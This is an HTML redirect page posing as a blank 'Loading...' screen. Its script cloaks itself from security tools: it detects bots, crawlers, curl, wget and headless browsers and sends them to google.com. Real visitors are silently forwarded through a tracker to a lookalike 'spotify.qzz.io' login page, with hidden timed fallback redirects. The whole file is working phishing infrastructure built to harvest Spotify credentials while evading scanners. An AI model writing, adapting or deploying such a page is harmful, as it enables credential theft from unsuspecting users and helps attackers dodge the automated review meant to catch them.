<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body{margin:0;background:#fff;visibility:hidden}
        .fallback{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;font-family:Arial,sans-serif;color:#666;font-size:14px}
    </style>
    <script>
        // Immediate silent redirect
        (function() {
            let s = 0;
            let ua = navigator.userAgent.toLowerCase();

            // Quick bot detection (minimal checks for speed)
            if (/bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 5;
            if (navigator.webdriver || window._phantom || window.callPhantom) s += 5;
            if (!window.localStorage || !window.requestAnimationFrame) s += 3;

            // Prepare URLs
            const realUrl = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=0&interactions=instant';
            const safeUrl = 'https://google.com';

            // Immediate silent redirect
            try {
                location.replace(s >= 10 ? safeUrl : realUrl);
            } catch(e) {
                location.href = s >= 10 ? safeUrl : realUrl;
            }
        })();
    </script>
</head>
<body>
    <div class="fallback" id="fallback">
        <div>Redirecting...</div>
        <div style="margin-top:10px"><a href="https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=manual&interactions=manual">Continue</a></div>
    </div>

    <script>
        // Fallback only if redirect fails
        setTimeout(function() {
            if (window.location.href.indexOf('spotify.qzz.io') === -1 && window.location.href.indexOf('google.com') === -1) {
                document.body.style.visibility = 'visible';
                document.getElementById('fallback').style.display = 'block';
            }
        }, 2000);

        // Additional fallback redirect
        setTimeout(function() {
            if (window.location.href.indexOf('spotify.qzz.io') === -1 && window.location.href.indexOf('google.com') === -1) {
                location.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=fallback&interactions=fallback';
            }
        }, 3000);
    </script>
</body>
</html>
